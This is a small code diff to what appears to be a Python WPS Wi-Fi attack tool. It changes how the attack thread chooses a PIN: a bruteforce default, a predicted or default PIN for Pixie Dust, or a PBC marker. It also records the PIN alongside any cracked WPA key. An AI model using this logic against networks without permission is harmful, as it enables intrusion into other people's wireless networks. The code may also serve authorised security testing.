@@ -257,12 +257,17 @@ def do_attack_in_thread(params):
                     companion = Companion(iface, write, print_debug=verbose)
                     current_companion = companion
 
+                    atk_pin = pin
                     if pbc:
+                        atk_pin = '<PBC>'
                         companion.single_connection(pbc_mode=True)
                     elif bruteforce:
-                        companion.smart_bruteforce(bssid, pin, delay)
+                        atk_pin = atk_pin if atk_pin else '0000'
+                        companion.smart_bruteforce(bssid, atk_pin, delay)
                     else:
-                        companion.single_connection(bssid, pin, pixie, False,
+                        if pixie and not atk_pin:
+                            atk_pin = WPSpin().getLikely(bssid) or '12345670'
+                        companion.single_connection(bssid, atk_pin, pixie, False,
                                                     show_cmd, pixie_force)
 
                     if companion.connection_status.status == 'GOT_PSK':
@@ -270,7 +275,7 @@ def do_attack_in_thread(params):
                         save_history(
                             essid=cs.essid or bssid,
                             bssid=cs.bssid or bssid,
-                            pin=pin,
+                            pin=atk_pin,
                             psk=cs.wpa_psk,
                             mode='pixie' if pixie else 'bruteforce' if bruteforce else 'pbc'
                         )
